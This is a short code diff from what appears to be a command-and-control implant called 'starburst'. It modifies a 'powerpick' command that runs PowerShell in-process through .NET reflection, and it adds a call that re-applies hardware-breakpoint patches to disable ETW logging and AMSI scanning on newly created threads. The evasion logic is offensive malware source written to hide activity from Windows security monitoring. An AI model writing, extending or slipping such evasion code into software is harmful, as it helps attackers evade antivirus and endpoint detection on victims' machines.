@@ -145,7 +145,7 @@ static auto WINAPI declfn pipe_reader_pp( LPVOID param ) -> DWORD {
                 available, &bytes_read, nullptr );
             ctx->output_len += bytes_read;
         } else {
-            SCALL( inst, kernel32.Sleep, 10 );
+            SCALL_VOID( inst, kernel32.Sleep, 10 );
         }
     }
 
@@ -459,6 +459,11 @@ auto declfn starburst::cmd_powerpick(
         nullptr, 0,
         reinterpret_cast<LPTHREAD_START_ROUTINE>( pipe_reader_pp ),
         &reader_ctx, 0, nullptr );
+
+    /* new thread = fresh DRs; re-apply ETW/AMSI hwbp to all threads */
+    #if (defined(INCLUDE_EVASION_AMSI) || defined(INCLUDE_EVASION_ETW)) && defined(_WIN64)
+        evasion_hwbp_repatch( inst );
+    #endif
 
     // _MethodInfo::Invoke_3 at vtable[37]
     typedef HRESULT ( __stdcall *fn_Invoke3 )(
